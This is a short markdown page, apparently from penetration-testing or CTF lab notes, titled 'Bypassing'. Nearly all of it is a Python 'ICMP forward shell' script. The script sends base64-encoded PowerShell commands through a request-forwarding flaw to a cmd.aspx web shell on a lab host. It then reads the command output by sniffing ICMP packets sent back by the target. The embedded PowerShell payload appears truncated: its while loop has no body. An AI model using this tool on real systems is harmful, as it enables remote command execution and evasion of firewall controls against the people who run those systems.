# Bypassing

## ICMP Forward Shell

```python
#!/usr/bin/env python3

import base64
import requests
import threading
from cmd import Cmd
from scapy.all import *
from urllib.parse import quote


class Term(Cmd):

    prompt = "[~] - "
    cmd_payload = """$cmd = '{cmd}'; $step=1000; $ping = New-Object System.Net.NetworkInformation.Ping; $opts = New-Object System.Net.NetworkInformation.PingOptions; $opts.DontFragment = $true; $res=(iex -command $cmd|out-string); $data = [System.Text.Encoding]::ASCII.GetBytes($res); $i=0; while($i -lt $data.length)"""


    def __init__(self):
        super().__init__()
        thread = threading.Thread(target=self.listen_thread, args=())
        thread.daemon = True
        thread.start()


    def listen_thread(self):
        sniff(filter="icmp and src 10.10.10.57", iface="tun0", prn=self.handle_icmp)


    def handle_icmp(self, pkt):
        print(pkt[Raw].load.decode(), end="")
        sys.stdout.flush()


    def default(self, args):
        cmd = self.cmd_payload.format(cmd=args)
        enccmd = quote(quote(base64.b64encode(cmd.encode('utf-16le')).decode()))
        requests.get(f'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=powershell+-enc+{enccmd}')


term = Term()
try:
    term.cmdloop()
except KeyboardInterrupt:
    print()
```

